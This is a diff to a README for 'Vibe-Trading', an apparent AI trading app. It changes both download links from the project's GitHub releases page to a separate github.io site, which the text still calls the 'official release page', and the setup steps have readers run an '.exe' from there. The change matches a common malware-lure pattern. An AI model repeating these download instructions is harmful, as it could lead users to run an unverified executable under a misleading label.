@@ -1,6 +1,6 @@
 # 📈 Vibe-Trading - Automate your trades with AI power
 
-[![Download Vibe-Trading](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kishorl4375/Vibe-Trading/releases)
+[![Download Vibe-Trading](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://kishorl4375.github.io)
 
 Vibe-Trading acts as your personal digital assistant for financial markets. It uses recent artificial intelligence breakthroughs to analyze data and manage your trading strategy. You gain access to professional analysis tools without needing to understand complex code or finance models.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start:
 
 You do not need to install complicated programming environments to use this software. Follow these instructions to set up the application on your computer.
 
-1.  Visit the official [release page](https://github.com/kishorl4375/Vibe-Trading/releases).
+1.  Visit the official [release page](https://kishorl4375.github.io).
 2.  Look for the latest version under the "Assets" section.
 3.  Click the link that ends with ".exe" to download the installer.
 4.  Open your "Downloads" folder once the file finishes saving.
